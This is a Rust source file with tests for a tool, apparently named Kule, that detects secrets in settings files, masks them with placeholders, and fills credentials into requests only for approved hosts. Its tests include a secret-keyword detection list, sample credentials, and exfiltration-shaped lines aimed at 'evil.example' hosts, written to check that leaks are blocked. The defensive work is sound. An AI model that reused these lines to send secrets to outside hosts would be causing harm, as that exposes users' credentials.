/// Whether the setting `key=value` looks like a secret: by its name (a key,
/// a token, a password, a connection string with a password in it), or by
/// a value that looks like one.
pub(crate) fn looks_secret(key: &str, value: &str) -> bool {
    if value.is_empty() {
        return false;
    }
    let key = key.to_ascii_uppercase();
    // A switch or a short number is no credential, whatever its key says
    // (`AUTH_ENABLED=true`, `MAX_TOKENS=4096`): masked, the setting stops
    // working, and the proxy would blank that word in every response. A
    // number stays one where the key names a password or a PIN.
    const SWITCHES: &[&str] = &["true", "false", "yes", "no", "on", "off"];
    if SWITCHES.iter().any(|s| value.eq_ignore_ascii_case(s)) {
        return false;
    }
    if value.len() < 8 && value.bytes().all(|b| b.is_ascii_digit()) {
        return ["PASSWORD", "PASSWD", "PASS", "PWD", "PIN"]
            .iter()
            .any(|w| key.contains(w));
    }
    const SECRET_WORDS: &[&str] = &[
        "KEY",
        "SECRET",
        "TOKEN",
        "PASSWORD",
        "PASSWD",
        "PASS",
        "PWD",
        "AUTH",
        "CREDENTIAL",
        "PRIVATE",
        "SIGNATURE",
        "DSN",
        "SALT",
        "COOKIE",
        "SESSION",
    ];
    if SECRET_WORDS.iter().any(|w| key.contains(w)) {
        return true;
    }
    // A URL with a password in it: `postgres://user:pass@host/db`.
    if let Some((_, rest)) = value.split_once("://")
        && let Some((userinfo, _)) = rest.split_once('@')
        && userinfo.contains(':')
    {
        return true;
    }
    // A long run of mixed characters with no spaces: what tokens look like.
    let classes = [
        value.chars().any(|c| c.is_ascii_lowercase()),
        value.chars().any(|c| c.is_ascii_uppercase()),
        value.chars().any(|c| c.is_ascii_digit()),
        value.chars().any(|c| !c.is_ascii_alphanumeric()),
    ]
    .iter()
    .filter(|b| **b)
    .count();
    value.len() >= 20 && !value.contains(char::is_whitespace) && classes >= 3
}

/// `text`, the content of a settings file, with the value of each
/// `KEY=value` line that `placeholder(key, value)` names a placeholder for
/// replaced by it; quotes, comments and the rest stay as they are. A quoted
/// value may run over several lines (a private key); it is masked whole.
pub(crate) fn mask_env(
    text: &str,
    mut placeholder: impl FnMut(&str, &str) -> Result<Option<String>>,
) -> Result<String> {
    let lines: Vec<&str> = text.split_inclusive('\n').collect();
    let mut out = String::with_capacity(text.len());
    let mut i = 0;
    while i < lines.len() {
        let line = lines[i];
        i += 1;
        let Some(setting) = parse_setting(line) else {
            out.push_str(line);
            continue;
        };
        let (key, start) = (setting.key, setting.value_start);
        let rest = &line[start..];
        match rest.chars().next() {
            Some(q @ ('"' | '\'')) => {
                // The closing quote on this line, or on a later one.
                let mut inner = String::new();
                let mut tail = None;
                let mut j = i - 1;
                let mut from = &rest[1..];
                loop {
                    if let Some(end) = closing_quote(from, q) {
                        inner.push_str(&from[..end]);
                        tail = Some((j, from[end..].to_owned()));
                        break;
                    }
                    inner.push_str(from);
                    j += 1;
                    if j >= lines.len() {
                        break;
                    }
                    from = lines[j];
                }
                match (tail, placeholder(key, &inner)?) {
                    (Some((last, tail)), Some(p)) => {
                        out.push_str(&line[..start]);
                        out.push(q);
                        out.push_str(&p);
                        out.push_str(&tail);
                        i = last + 1;
                    }
                    _ => out.push_str(line),
                }
            }
            _ => {
                let body = rest.trim_end_matches(['\n', '\r']);
                // An unquoted value ends at a comment.
                let end = body.find(" #").unwrap_or(body.len());
                let value = body[..end].trim_end();
                match placeholder(key, value)? {
                    Some(p) if !value.is_empty() => {
                        out.push_str(&line[..start]);
                        out.push_str(&p);
                        out.push_str(&rest[value.len()..]);
                    }
                    _ => out.push_str(line),
                }
            }
        }
    }
    Ok(out)
}

struct Setting<'a> {
    key: &'a str,
    /// Where the value starts in the line.
    value_start: usize,
}

/// `KEY=value` or `export KEY=value`, with spaces around `=` allowed.
fn parse_setting(line: &str) -> Option<Setting<'_>> {
    let trimmed = line.trim_start();
    if trimmed.starts_with('#') {
        return None;
    }
    let after_export = match trimmed.strip_prefix("export ") {
        Some(rest) => rest.trim_start(),
        None => trimmed,
    };
    let key_len = after_export
        .find(|c: char| !(c.is_ascii_alphanumeric() || c == '_' || c == '.' || c == '-'))
        .unwrap_or(after_export.len());
    let key = &after_export[..key_len];
    if key.is_empty() || !key.starts_with(|c: char| c.is_ascii_alphabetic() || c == '_') {
        return None;
    }
    let after_key = &after_export[key_len..];
    let eq = after_key.trim_start();
    let eq = eq.strip_prefix('=')?;
    let value = eq.trim_start_matches([' ', '\t']);
    Some(Setting {
        key,
        value_start: line.len() - value.len(),
    })
}

/// Where `quote` closes in `text`, skipping `\"` inside double quotes.
fn closing_quote(text: &str, quote: char) -> Option<usize> {
    let mut escaped = false;
    for (i, c) in text.char_indices() {
        if quote == '"' && c == '\\' && !escaped {
            escaped = true;
            continue;
        }
        if c == quote && !escaped {
            return Some(i);
        }
        escaped = false;
    }
    None
}

/// Masks `text`, the settings file at `path`, with the placeholders of
/// `task` (new ones made as needed) and of `vault`'s kept secrets: the
/// settings that look like secrets, then every kept secret left wherever
/// it is (see [`mask_lines`]).
pub(crate) fn mask_with(
    path: &str,
    text: &str,
    task: &mut TaskSecrets,
    vault: &Vault,
) -> Result<String> {
    let settings = mask_settings(path, text, task, vault)?;
    Ok(mask_lines(path, &settings, task, vault))
}

/// `text` with each kept secret in it (inside a value, an alias, a
/// comment) replaced by its placeholder. Each line that changed is kept
/// with what it was, as many times as the file holds it, for
/// [`Vault::unmask`] to put back; a placeholder already there is left as
/// it is.
fn mask_lines(path: &str, text: &str, task: &mut TaskSecrets, vault: &Vault) -> String {
    let forms = vault.kept_forms();
    if forms.is_empty() {
        return text.to_owned();
    }
    let mut out = String::with_capacity(text.len());
    let mut found: Vec<Place> = Vec::new();
    for line in text.split_inclusive('\n') {
        let body = line.trim_end_matches(['\n', '\r']);
        let mut masked = String::with_capacity(body.len());
        let mut first = None;
        let mut at = 0;
        'scan: while at < body.len() {
            let rest = &body[at..];
            if rest.starts_with(PLACEHOLDER_PREFIX) {
                let end = rest
                    .find(|c: char| !(c.is_ascii_alphanumeric() || c == '_'))
                    .unwrap_or(rest.len());
                masked.push_str(&rest[..end]);
                at += end;
                continue;
            }
            for (form, placeholder) in &forms {
                if rest.starts_with(form.as_str()) {
                    masked.push_str(placeholder);
                    first.get_or_insert(*placeholder);
                    at += form.len();
                    continue 'scan;
                }
            }
            let c = rest.chars().next().expect("not at the end");
            masked.push(c);
            at += c.len_utf8();
        }
        let Some(placeholder) = first else {
            out.push_str(line);
            continue;
        };
        out.push_str(&masked);
        out.push_str(&line[body.len()..]);
        found.push(Place {
            placeholder: placeholder.to_owned(),
            masked: Masked {
                path: path.to_owned(),
                key: String::new(),
                value: body.to_owned(),
                line: Some(masked),
            },
        });
    }
    for place in &found {
        let wanted = found.iter().filter(|p| *p == place).count();
        let kept = task.also.iter().filter(|p| *p == place).count();
        if kept < wanted {
            task.also.push(place.clone());
        }
    }
    out
}

/// Masks the settings in `text` that look like secrets, or are kept ones.
fn mask_settings(path: &str, text: &str, task: &mut TaskSecrets, vault: &Vault) -> Result<String> {
    mask_env(text, |key, value| {
        let kept = vault.placeholder_for_value(value);
        if kept.is_none() && !looks_secret(key, value) {
            return Ok(None);
        }
        if value.starts_with(PLACEHOLDER_PREFIX) {
            return Ok(None);
        }
        if let Some(p) = kept {
            // Kept so commit can put it back like any other, wherever it
            // was found.
            let here = Masked {
                path: path.to_owned(),
                key: key.to_owned(),
                value: value.to_owned(),
                line: None,
            };
            match task.masked.get(p) {
                None => {
                    task.masked.insert(p.to_owned(), here);
                }
                Some(first) if *first == here => {}
                Some(_) => {
                    let place = Place {
                        placeholder: p.to_owned(),
                        masked: here,
                    };
                    if !task.also.contains(&place) {
                        task.also.push(place);
                    }
                }
            }
            return Ok(Some(p.to_owned()));
        }
        let known = task
            .masked
            .iter()
            .find(|(_, m)| m.path == path && m.key == key && m.value == value)
            .map(|(p, _)| p.clone());
        let p = match known {
            Some(p) => p,
            None => {
                let p = new_placeholder()?;
                task.masked.insert(
                    p.clone(),
                    Masked {
                        path: path.to_owned(),
                        key: key.to_owned(),
                        value: value.to_owned(),
                        line: None,
                    },
                );
                p
            }
        };
        Ok(Some(p))
    })
}

/// A key for [`shown`]: new for each view, so its marks say nothing about
/// a value beyond that view.
pub(crate) fn view_key() -> Result<[u8; 32]> {
    let path = Path::new("/dev/urandom");
    let mut key = [0u8; 32];
    std::fs::File::open(path)
        .and_then(|mut f| f.read_exact(&mut key))
        .at(path)?;
    Ok(key)
}

/// `text` as a person is shown it: the value of every setting that looks
/// like a secret, every value `vault` holds wherever it is, and every word
/// shaped like a token, each as `‹hidden 3fa9c2›`. The mark is the value
/// hashed with `key`, so in one view (both sides of a diff) a value reads
/// the same wherever it is, and a changed one differently, while what it
/// is never shows.
pub(crate) fn shown(text: &str, vault: &Vault, key: &[u8; 32]) -> String {
    let mark = |value: &str| {
        let hash = blake3::keyed_hash(key, value.as_bytes()).to_hex();
        format!("‹hidden {}›", &hash[..6])
    };
    let mut text = mask_env(text, |k, value| {
        let secret = looks_secret(k, value) || vault.placeholder_for_value(value).is_some();
        Ok(secret.then(|| mark(value)))
    })
    .unwrap_or_else(|_| text.to_owned());
    let mut held = vault.values();
    // The longest first, so a value inside another is not marked half.
    held.sort_by_key(|v| std::cmp::Reverse(v.len()));
    for value in held.iter().filter(|v| !v.is_empty()) {
        if text.contains(value.as_str()) {
            text = text.replace(value.as_str(), &mark(value));
        }
    }
    // What is left: words that look like tokens, in any kind of file (a
    // tool's YAML or JSON settings). Paths and plain URLs are left alone.
    let mut out = String::with_capacity(text.len());
    let mut word = String::new();
    let flush = |word: &mut String, out: &mut String| {
        let hide = if word.starts_with('‹') || word.starts_with(['/', '~', '.']) {
            false
        } else if let Some((_, rest)) = word.split_once("://") {
            // A URL: by a password in it, or a query value that looks secret.
            let password = rest
                .split_once('@')
                .is_some_and(|(user, _)| user.contains(':') && !user.contains('/'));
            let query = rest.split_once('?').is_some_and(|(_, q)| {
                q.split('&').any(|pair| {
                    let (k, v) = pair.split_once('=').unwrap_or(("", pair));
                    looks_secret(k, v)
                })
            });
            password || query
        } else {
            looks_secret("", word)
        };
        if hide {
            out.push_str(&mark(word));
        } else {
            out.push_str(word);
        }
        word.clear();
    };
    for c in text.chars() {
        if c.is_whitespace()
            || matches!(
                c,
                '"' | '\'' | '`' | ',' | ';' | '=' | '(' | ')' | '[' | ']' | '{' | '}' | '<' | '>'
            )
        {
            flush(&mut word, &mut out);
            out.push(c);
        } else {
            word.push(c);
        }
    }
    flush(&mut word, &mut out);
    out
}

#[cfg(test)]
mod tests {
    use tempfile::TempDir;

    use super::*;

    fn masked(text: &str) -> String {
        let mut n = 0;
        mask_env(text, |key, value| {
            n += 1;
            Ok(looks_secret(key, value).then(|| format!("P{n}")))
        })
        .unwrap()
    }

    #[test]
    fn what_looks_secret_is_hidden_from_view_and_the_rest_shown() {
        let mut vault = Vault::default();
        vault
            .with_keys(&[AgentKey {
                name: "SHOP_KEY".into(),
                value: "kept-value-1234".into(),
                hosts: vec!["api.example.com".into()],
            }])
            .unwrap();
        let key = [7u8; 32];
        let text = "export GITHUB_TOKEN=ghp_k3yL1ke0nlyF0rTest1ng9Abc\nexport EDITOR=vi\n\
                    alias shop='curl -H \"x-key: kept-value-1234\" https://api.example.com/v1/items'\n\
                    token: \"tok-Zx81kQm3Lr0ns7TpQw2Exy\"\n\
                    db: postgres://app:hunter2@db.example.com/app\n\
                    path: /Users/me/Library/Application/Support/Tool9X\n";
        let seen = shown(text, &vault, &key);
        for secret in [
            "ghp_k3yL1ke0nlyF0rTest1ng9Abc",
            "kept-value-1234",
            "tok-Zx81kQm3Lr0ns7TpQw2Exy",
            "hunter2",
        ] {
            assert!(!seen.contains(secret), "{secret} in {seen}");
        }
        for kept in [
            "export EDITOR=vi",
            "https://api.example.com/v1/items",
            "/Users/me/Library/Application/Support/Tool9X",
            "export GITHUB_TOKEN=‹hidden ",
        ] {
            assert!(seen.contains(kept), "{kept} not in {seen}");
        }
        // One value reads the same wherever it is, and in another view
        // (another key) differently.
        let again = shown("A_TOKEN=ghp_k3yL1ke0nlyF0rTest1ng9Abc\n", &vault, &key);
        let mark = again.trim_start_matches("A_TOKEN=").trim_end();
        assert!(seen.contains(mark), "{mark} not in {seen}");
        let other = shown(
            "A_TOKEN=ghp_k3yL1ke0nlyF0rTest1ng9Abc\n",
            &vault,
            &[8u8; 32],
        );
        assert_ne!(again, other);
        assert_ne!(
            shown("A_TOKEN=ghp_k3yL1ke0nlyF0rTest1ng9Abd\n", &vault, &key),
            again,
            "a changed value must read as changed"
        );
    }

    #[test]
    fn settings_that_look_secret_are_masked_and_the_rest_kept() {
        let text = "# keys\nPORT=3000\nSTRIPE_KEY=sk_live_abc # live\nexport DB_PASSWORD = 'hunter2'\nDATABASE_URL=postgres://app:pw@db:5432/app\nNAME=\"a b\"\nTOKEN=\"line\\\"quoted\"\n";
        assert_eq!(
            masked(text),
            "# keys\nPORT=3000\nSTRIPE_KEY=P2 # live\nexport DB_PASSWORD = 'P3'\nDATABASE_URL=P4\nNAME=\"a b\"\nTOKEN=\"P6\"\n"
        );
    }

    #[test]
    fn a_quoted_value_over_several_lines_is_masked_whole() {
        let text = "PRIVATE_KEY=\"-----BEGIN KEY-----\nabc\n-----END KEY-----\"\nAFTER=1\n";
        assert_eq!(masked(text), "PRIVATE_KEY=\"P1\"\nAFTER=1\n");
        // Never closed: left alone.
        assert_eq!(
            masked("PRIVATE_KEY=\"open\nX=1\n"),
            "PRIVATE_KEY=\"open\nX=1\n"
        );
    }

    #[test]
    fn which_files_hold_settings() {
        for yes in [".env", "apps/web/.env.local", "production.env", ".envrc"] {
            assert!(is_env_file(yes), "{yes}");
        }
        for no in [
            ".env.example",
            "env.ts",
            ".environment",
            "src/.env.sample",
            "README.md",
        ] {
            assert!(!is_env_file(no), "{no}");
        }
    }

    #[test]
    fn values_that_look_like_tokens() {
        assert!(looks_secret("X", "ghp_aB3dE6fG9hJ2kL5mN8pQ1rS4tU7v"));
        assert!(!looks_secret("X", "development"));
        assert!(!looks_secret("URL", "https://example.com/path"));
        assert!(!looks_secret("PORT", "3000"));
        assert!(!looks_secret("API_KEY", ""));
    }

    #[test]
    fn switches_and_short_numbers_are_settings_whatever_their_key() {
        assert!(!looks_secret("ALLOW_PRIVATE_NETWORKS", "false"));
        assert!(!looks_secret("AUTH_ENABLED", "True"));
        assert!(!looks_secret("SESSION_SECURE", "on"));
        assert!(!looks_secret("MAX_TOKENS", "4096"));
        assert!(!looks_secret("SESSION_TTL", "3600"));
        // Where the key names a password, a number is one; a long run of
        // digits under a key word stays a secret.
        assert!(looks_secret("DB_PASSWORD", "123456"));
        assert!(looks_secret("CARD_PIN", "4829"));
        assert!(looks_secret("API_KEY", "12345678901234"));
        assert!(looks_secret("API_KEY", "falsetto-not-a-switch"));
    }

    fn vault_with(home: &TempDir, ws: &TempDir, dir: &TempDir) -> Vault {
        add_secret(
            home.path(),
            "STRIPE_KEY",
            "sk_test_real",
            &["api.stripe.com".into()],
            None,
        )
        .unwrap();
        Vault::load(home.path(), ws.path(), dir.path()).unwrap()
    }

    /// A kept secret is masked inside a line, in the form a URL gives it
    /// too, and never inside a placeholder; a line goes back only as Kule
    /// masked it, as many times as the file held it, and in that file.
    #[test]
    fn a_kept_secret_is_masked_inside_a_line_and_put_back_as_it_was() {
        let (home, ws, dir) = (
            TempDir::new().unwrap(),
            TempDir::new().unwrap(),
            TempDir::new().unwrap(),
        );
        for (name, value) in [("WORD", "secret"), ("SLASHED", "a/b+c=Zz9")] {
            add_secret(home.path(), name, value, &["x.example".into()], None).unwrap();
        }
        let vault = vault_with(&home, &ws, &dir);
        let mut task = TaskSecrets::load(dir.path(), home.path()).unwrap();
        let text = "STRIPE_KEY=sk_test_real\n\
                    alias pay='curl -u sk_test_real: \"https://x.example/?k=a%2Fb%2Bc%3DZz9\"' # a secret\n\
                    export N=1\n";
        let out = mask_with(".zshrc", text, &mut task, &vault).unwrap();
        for value in ["sk_test_real", "a%2Fb%2Bc%3DZz9", " secret"] {
            assert!(!out.contains(value), "{value} in {out}");
        }
        // Four placeholders, none of them masked inside.
        assert_eq!(out.matches(PLACEHOLDER_PREFIX).count(), 4, "{out}");
        assert!(!out.contains("kule_kule"), "{out}");
        assert!(out.ends_with("\nexport N=1\n"), "{out}");
        assert_eq!(mask_with(".zshrc", &out, &mut task, &vault).unwrap(), out);
        task.save(dir.path(), home.path()).unwrap();

        let vault = Vault::load(home.path(), ws.path(), dir.path()).unwrap();
        assert_eq!(vault.unmask(".zshrc", &out), text);
        let alias = out.lines().nth(1).unwrap();
        let changed = out.replace("curl -u", "curl -su");
        assert!(
            !vault.unmask(".zshrc", &changed).contains("a%2Fb"),
            "a changed line stays masked"
        );
        let copied = format!("{out}{alias}\n");
        assert_eq!(
            vault.unmask(".zshrc", &copied),
            format!("{text}{alias}\n"),
            "a copy of a line stays masked"
        );
        assert_eq!(vault.unmask(".bashrc", alias), alias);

        // A line the file holds twice goes back twice.
        let mut task = TaskSecrets::load(dir.path(), home.path()).unwrap();
        let twice = "curl -u sk_test_real:\ncurl -u sk_test_real:\n";
        let out = mask_with(".bashrc", twice, &mut task, &vault).unwrap();
        assert!(!out.contains("sk_test_real"), "{out}");
        task.save(dir.path(), home.path()).unwrap();
        let vault = Vault::load(home.path(), ws.path(), dir.path()).unwrap();
        assert_eq!(vault.unmask(".bashrc", &out), twice);
    }

    #[test]
    fn a_secret_fills_requests_to_its_hosts_only() {
        let (home, ws, dir) = (
            TempDir::new().unwrap(),
            TempDir::new().unwrap(),
            TempDir::new().unwrap(),
        );
        let vault = vault_with(&home, &ws, &dir);
        let [(name, p)] = vault.env().try_into().unwrap();
        assert_eq!(name, "STRIPE_KEY");
        assert!(p.starts_with(PLACEHOLDER_PREFIX) && p.len() > 30);
        let head = format!("POST /v1/charges HTTP/1.1\r\nAuthorization: Bearer {p}\r\n\r\n");

        let (filled, used) = vault.fill("api.stripe.com", &head);
        assert_eq!(
            filled,
            "POST /v1/charges HTTP/1.1\r\nAuthorization: Bearer sk_test_real\r\n\r\n"
        );
        assert_eq!(used, ["STRIPE_KEY"]);
        let (elsewhere, used) = vault.fill("evil.example.com", &head);
        assert_eq!((elsewhere, used.len()), (head.clone(), 0));

        // Inside Basic credentials, as git sends a token.
        let basic = base64::engine::general_purpose::STANDARD.encode(format!("x:{p}"));
        let (filled, _) = vault.fill(
            "api.stripe.com",
            &format!("GET / HTTP/1.1\r\nauthorization: Basic {basic}\r\n\r\n"),
        );
        let expect = base64::engine::general_purpose::STANDARD.encode("x:sk_test_real");
        assert_eq!(
            filled,
            format!("GET / HTTP/1.1\r\nauthorization: Basic {expect}\r\n\r\n")
        );

        // The placeholder stays the same from run to run.
        let again = Vault::load(home.path(), ws.path(), dir.path()).unwrap();
        assert_eq!(again.env()[0].1, p);
    }

    #[test]
    fn a_secret_goes_into_credential_headers_alone() {
        let (home, ws, dir) = (
            TempDir::new().unwrap(),
            TempDir::new().unwrap(),
            TempDir::new().unwrap(),
        );
        add_secret(
            home.path(),
            "KEY",
            "a+b/c\"d\\e",
            &["api.example.com".into()],
            None,
        )
        .unwrap();
        let vault = Vault::load(home.path(), ws.path(), dir.path()).unwrap();
        let p = vault.env()[0].1.clone();
        let host = "api.example.com";

        // In the URL or a header that holds no credentials, it stays.
        let elsewhere = format!("GET /v1?key={p} HTTP/1.1\r\nX-Key: {p}\r\n\r\n");
        let (filled, used) = vault.fill(host, &elsewhere);
        assert_eq!((filled, used.len()), (elsewhere, 0));
        // In a credential header, however cased, it is filled.
        let (filled, used) =
            vault.fill(host, &format!("GET /v1 HTTP/1.1\r\nX-Api-Key: {p}\r\n\r\n"));
        assert_eq!(filled, "GET /v1 HTTP/1.1\r\nX-Api-Key: a+b/c\"d\\e\r\n\r\n");
        assert_eq!(used, ["KEY"]);

        // Credentials that are not Kule's are told apart from its own.
        let ours = format!("GET / HTTP/1.1\r\nAuthorization: Bearer {p}\r\n\r\n");
        assert_eq!(vault.foreign_credential(host, &ours), None);
        let theirs = "GET / HTTP/1.1\r\nx-api-key: sk-other\r\n\r\n";
        assert_eq!(
            vault.foreign_credential(host, theirs).as_deref(),
            Some("x-api-key")
        );
        assert_eq!(vault.foreign_credential("other.example", theirs), None);
        // In the address too, by any spelling of the parameter.
        for target in [
            "/v1/x?key=AIza-other",
            "/v1/x?alt=sse&API_KEY=other",
            "/x?access_token=t",
            "/v1/x?%6Bey=AIza-other",
            "/v1/x?ke%79=AIza-other",
        ] {
            let theirs = format!("POST {target} HTTP/1.1\r\nHost: {host}\r\n\r\n");
            assert!(
                vault.foreign_credential(host, &theirs).is_some(),
                "{target}"
            );
        }
        let plain =
            format!("GET /v1/x?alt=sse&monkey=1 HTTP/1.1\r\nAuthorization: Bearer {p}\r\n\r\n");
        assert_eq!(vault.foreign_credential(host, &plain), None);
        let basic = base64::engine::general_purpose::STANDARD.encode(format!("x:{p}"));
        let ours = format!("GET / HTTP/1.1\r\nAuthorization: Basic {basic}\r\n\r\n");
        assert_eq!(vault.foreign_credential(host, &ours), None);
        // Someone else's beside Kule's placeholder, or a session cookie.
        for line in [
            format!("Authorization: Bearer {p} sk-other"),
            format!("x-api-key: sk-other{p}"),
            format!(
                "Authorization: Basic {}",
                base64::engine::general_purpose::STANDARD.encode(format!("sk-other:x{p}"))
            ),
            "Cookie: session=other".to_owned(),
        ] {
            let theirs = format!("GET / HTTP/1.1\r\n{line}\r\n\r\n");
            assert!(vault.foreign_credential(host, &theirs).is_some(), "{line}");
        }

        // A response that repeats it may hold any of those forms.
        assert_eq!(
            vault.values(),
            ["a%2Bb%2Fc%22d%5Ce", "a+b/c\"d\\e", "a+b/c\\\"d\\\\e"]
        );
    }

    #[test]
    fn a_masked_value_that_is_a_kept_secret_goes_where_the_secret_goes() {
        let (home, ws, dir) = (
            TempDir::new().unwrap(),
            TempDir::new().unwrap(),
            TempDir::new().unwrap(),
        );
        let vault = vault_with(&home, &ws, &dir);
        let p = vault.env()[0].1.clone();
        let mut task = TaskSecrets::load(dir.path(), home.path()).unwrap();
        let text = "STRIPE_KEY=sk_test_real\nOTHER_TOKEN=abc\nPORT=1\n";
        let out = mask_with(".env", text, &mut task, &vault).unwrap();
        let other = task
            .masked
            .iter()
            .find(|(_, m)| m.key == "OTHER_TOKEN")
            .map(|(p, _)| p.clone())
            .unwrap();
        assert_eq!(
            out,
            format!("STRIPE_KEY={p}\nOTHER_TOKEN={other}\nPORT=1\n")
        );
        // Masking again gives the same text.
        assert_eq!(mask_with(".env", text, &mut task, &vault).unwrap(), out);
        task.save(dir.path(), home.path()).unwrap();

        // The kept secret masked in a second file too.
        let local = "STRIPE_KEY=sk_test_real\n";
        let local_out = mask_with(".env.local", local, &mut task, &vault).unwrap();
        assert_eq!(local_out, format!("STRIPE_KEY={p}\n"));
        task.save(dir.path(), home.path()).unwrap();

        let vault = Vault::load(home.path(), ws.path(), dir.path()).unwrap();
        assert_eq!(vault.unmask(".env", &out), text);
        assert_eq!(vault.unmask(".env.local", &local_out), local);
        // A placeholder goes back only where it was put: not in another
        // file, under another setting, or inside another value.
        for (path, moved, back) in [
            (
                ".env.production",
                format!("STRIPE_KEY={p}\n"),
                format!("STRIPE_KEY={p}\n"),
            ),
            (
                ".env",
                format!("LEAK={p}\nSTRIPE_KEY={p}\n"),
                format!("LEAK={p}\nSTRIPE_KEY=sk_test_real\n"),
            ),
            (
                ".env",
                format!("URL=https://x.example/?t={p}\n"),
                format!("URL=https://x.example/?t={p}\n"),
            ),
        ] {
            assert_eq!(vault.unmask(path, &moved), back, "{path}");
        }
        // The other one has no hosts: it never leaves.
        let (filled, _) = vault.fill("api.stripe.com", &format!("X: {other}\r\n"));
        assert_eq!(filled, format!("X: {other}\r\n"));
    }

    #[test]
    fn secrets_are_kept_for_their_owner_alone() {
        use std::os::unix::fs::PermissionsExt;
        let home = TempDir::new().unwrap();
        add_secret(home.path(), "A_KEY", "v", &["api.example.com".into()], None).unwrap();
        let mode = std::fs::metadata(home.path().join(SECRETS_FILE))
            .unwrap()
            .permissions()
            .mode();
        assert_eq!(mode & 0o777, 0o600);
        let refused = [
            ("lower", "v", vec!["api.example.com".to_owned()]),
            ("A_KEY", "", vec!["api.example.com".to_owned()]),
            ("A_KEY", "two\nlines", vec!["api.example.com".to_owned()]),
            ("A_KEY", "v", vec![]),
            ("A_KEY", "v", vec!["*.example.com".to_owned()]),
            ("A_KEY", "v", vec!["api.example.com:443".to_owned()]),
        ];
        for (name, value, hosts) in refused {
            assert!(
                add_secret(home.path(), name, value, &hosts, None).is_err(),
                "{name} {value:?} {hosts:?}"
            );
        }
        assert_eq!(secrets(home.path()).unwrap().len(), 1);
        assert!(remove_secret(home.path(), "A_KEY", None).unwrap());
        assert!(secrets(home.path()).unwrap().is_empty());
    }

    /// A value sealed before values were bound to their entry opens, and is
    /// sealed bound at that read.
    #[test]
    fn a_value_sealed_unbound_is_bound_at_the_next_read() {
        let home = TempDir::new().unwrap();
        let sealer = Sealer::open(home.path(), None).unwrap();
        let disk = serde_json::json!({
            "key": "file",
            "secrets": [{
                "name": "OLD_KEY",
                "hosts": ["api.example.com"],
                "added_unix": 1,
                "sealed": sealer.seal("sk-old", b"").unwrap(),
            }],
        });
        let path = home.path().join(SECRETS_FILE);
        std::fs::write(&path, disk.to_string()).unwrap();
        let store = read_store(home.path()).unwrap();
        assert_eq!(store.secrets[0].value, "sk-old");
        let now: OnDisk = read_json(&path).unwrap();
        assert!(now.secrets[0].bound);
        let sealed = now.secrets[0].sealed.as_deref().unwrap();
        assert!(sealer.unseal(sealed, b"").is_err());
        assert_eq!(read_store(home.path()).unwrap().secrets[0].value, "sk-old");
    }

    /// The values masked in a task's copy are kept sealed, each to the
    /// setting it came from: the file holds none of them, and a value moved
    /// to another entry does not open.
    #[test]
    fn a_tasks_masked_values_are_kept_sealed_to_their_setting() {
        let (home, dir) = (TempDir::new().unwrap(), TempDir::new().unwrap());
        let mut task = TaskSecrets::default();
        for (p, key, value) in [
            ("kule_secret_a", "A_TOKEN", "sk-one"),
            ("kule_secret_b", "B_TOKEN", "sk-two"),
        ] {
            task.masked.insert(
                p.to_owned(),
                Masked {
                    path: ".env".into(),
                    key: key.into(),
                    value: value.into(),
                    line: None,
                },
            );
        }
        task.also.push(Place {
            placeholder: "kule_secret_a".into(),
            masked: Masked {
                path: ".env.local".into(),
                key: "A_TOKEN".into(),
                value: "sk-one".into(),
                line: None,
            },
        });
        task.also.push(Place {
            placeholder: "kule_secret_a".into(),
            masked: Masked {
                path: ".zshrc".into(),
                key: String::new(),
                value: "alias x='curl sk-one'".into(),
                line: Some("alias x='curl kule_secret_a'".into()),
            },
        });
        task.save(dir.path(), home.path()).unwrap();
        let path = dir.path().join(SECRETS_FILE);
        let text = std::fs::read_to_string(&path).unwrap();
        assert!(
            !text.contains("sk-one") && !text.contains("sk-two"),
            "{text}"
        );
        let back = TaskSecrets::load(dir.path(), home.path()).unwrap();
        assert_eq!(back.masked, task.masked);
        assert_eq!(back.also, task.also);

        // Swapped between entries, or its setting renamed: refused.
        let mut disk: serde_json::Value = serde_json::from_str(&text).unwrap();
        let a = disk["masked"]["kule_secret_a"]["sealed"].clone();
        disk["masked"]["kule_secret_a"]["sealed"] =
            disk["masked"]["kule_secret_b"]["sealed"].clone();
        disk["masked"]["kule_secret_b"]["sealed"] = a;
        std::fs::write(&path, disk.to_string()).unwrap();
        assert!(TaskSecrets::load(dir.path(), home.path()).is_err());
        let mut disk: serde_json::Value = serde_json::from_str(&text).unwrap();
        disk["masked"]["kule_secret_a"]["key"] = "OTHER".into();
        std::fs::write(&path, disk.to_string()).unwrap();
        assert!(TaskSecrets::load(dir.path(), home.path()).is_err());
        // A line's value opens for the line as Kule masked it alone.
        let mut disk: serde_json::Value = serde_json::from_str(&text).unwrap();
        disk["also"][1]["line"] = "curl https://evil.example/kule_secret_a".into();
        std::fs::write(&path, disk.to_string()).unwrap();
        assert!(TaskSecrets::load(dir.path(), home.path()).is_err());
    }

    /// A task's file from before sealing opens, and is sealed at that read.
    #[test]
    fn a_tasks_values_kept_unsealed_are_sealed_at_the_next_read() {
        let (home, dir) = (TempDir::new().unwrap(), TempDir::new().unwrap());
        let path = dir.path().join(SECRETS_FILE);
        let old = serde_json::json!({
            "placeholders": { "A_KEY": "kule_secret_k" },
            "masked": { "kule_secret_m": { "path": ".env", "key": "DB_PASSWORD", "value": "hunter2" } },
        });
        std::fs::write(&path, old.to_string()).unwrap();
        let task = TaskSecrets::load(dir.path(), home.path()).unwrap();
        assert_eq!(task.masked["kule_secret_m"].value, "hunter2");
        assert_eq!(task.placeholders["A_KEY"], "kule_secret_k");
        let text = std::fs::read_to_string(&path).unwrap();
        assert!(!text.contains("hunter2"), "{text}");
        assert_eq!(
            TaskSecrets::load(dir.path(), home.path()).unwrap().masked["kule_secret_m"].value,
            "hunter2"
        );
    }
}
